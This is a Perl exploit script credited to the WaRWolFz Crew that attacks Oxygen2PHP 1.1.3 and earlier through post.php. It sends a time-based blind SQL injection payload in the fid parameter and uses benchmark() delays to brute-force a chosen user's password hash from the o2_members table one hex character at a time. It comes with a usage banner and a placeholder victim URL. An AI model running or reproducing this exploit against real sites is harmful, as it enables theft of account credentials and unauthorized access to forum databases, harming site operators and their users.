#!/usr/bin/perl
#[0-Day] Oxygen2PHP <= 1.1.3 (post.php) Remote Blind SQL Injection Exploit
#Coded By Dante90, WaRWolFz Crew
#Bug Discovered By: Dante90, WaRWolFz Crew

use strict;
use LWP::UserAgent;

use HTTP::Request::Common;
use Time::HiRes;
use IO::Socket;

my ($Hash,$Time,$Time_Start,$Time_End,$Response);
my ($Start,$End);
my @chars = (48,49,50,51,52,53,54,55,56,57,97,98,99,100,101,102);
my $Host = "http://www.victime_site.org/path/"; #Insert Victime Web Site Link
my $uid  = shift or &usage;
my $Method = HTTP::Request->new(GET => $Host);
my $HTTP = new LWP::UserAgent;
my $Referrer = "http://warwolfz.altervista.org/";
my $DefaultTime = request($Referrer);

sub Blind_SQL_Jnjection{
	my ($dec,$hex) = @_;
	return "./post.php?action=newthread&fid='+OR+1!=(SELECT IF((ASCII(SUBSTRING(`password`,${dec},1))=${hex}),benchmark(200000000,CHAR(0)),0) FROM `o2_members` WHERE `uid`=${uid})/*";
}

for(my $I=1; $I<=32; $I++){ #N Hash characters
	for(my $J=0; $J<=15; $J++){ #0 -> F
		$Time_Start = time();
		$HTTP->get($Host.Blind_SQL_Jnjection($I,$chars[$J]));
		$Time_End = time();
		$Time = request($Referrer);
		refresh($Host, $DefaultTime, $J, $Hash, $Time, $I);
		if($Time_End - $Time_Start > 6){
			$Time = request($Referrer);
			refresh($Host, $DefaultTime, $J, $Hash, $Time, $I);
			if($Time_End - $Time_Start > 6){
				syswrite(STDOUT,chr($chars[$J]));
				$Hash .= chr($chars[$J]);
				$Time = request($Referrer);
				refresh($Host, $DefaultTime, $J, $Hash, $Time, $I);
				last;
			}
		}
	}
	if($I == 1 && length $Hash < 0 && !$Hash){
		print " * Exploit Failed                                      *\n";
		print " ------------------------------------------------------ \n";
		exit;
	}
	if($I == 32){
		print " * Exploit Successfully Executed                       *\n";
		print " ------------------------------------------------------\n ";
		system("pause");
	}
}

sub usage{
	system("cls");
	{
		print " \n [0-Day] Oxygen2PHP <= 1.1.3 (post.php) Remote Blind SQL Injection Exploit\n";
		print " ------------------------------------------------------ \n";
		print " * USAGE:                                             *\n";
		print " * cd [Local Disk]:\\[Directory Of Exploit]\\           *\n";
		print " * perl name_exploit.pl [uid]                         *\n";
		print " ------------------------------------------------------ \n";
		print " *         Powered By Dante90, WaRWolFz Crew          *\n";
		print " * www.warwolfz.org - dante90_founder[at]warwolfz.org *\n";
		print " ------------------------------------------------------ \n";
	};
	exit;
}

sub request{
	$Referrer = $_[0];
	$Method->referrer($Referrer);
	$Start = Time::HiRes::time();
	$Response = $HTTP->request($Method);
	$Response->is_success() or die "$Host : ", $Response->message,"\n";
	$End = Time::HiRes::time();
	$Time = $End - $Start;
	return $Time;
}

sub refresh{
	system("cls");
	{
		print " \n [0-Day] Oxygen2PHP <= 1.1.3 (post.php) Remote Blind SQL Injection Exploit\n";
		print " ------------------------------------------------------ \n";
		print " * USAGE:                                             *\n";
		print " * cd [Local Disk]:\\[Directory Of Exploit]\\           *\n";
		print " * perl name_exploit.pl [uid]                         *\n";
		print " ------------------------------------------------------ \n";
		print " *         Powered By Dante90, WaRWolFz Crew          *\n";
		print " * www.warwolfz.org - dante90_founder[at]warwolfz.org *\n";
		print " ------------------------------------------------------ \n";
	};
	print " * Victime Site: " . $_[0] . "\n";
	print " * Default Time: " . $_[1] . " seconds\n";
	print " * BruteForcing Hash: " . chr($chars[$_[2]]) . "\n";
	print " * BruteForcing N Char Hash: " . $_[5] . "\n";
	print " * SQL Time: " . $_[4] . " seconds\n";
	print " * Hash: " . $_[3] . "\n";
}

#WaRWolFz Crew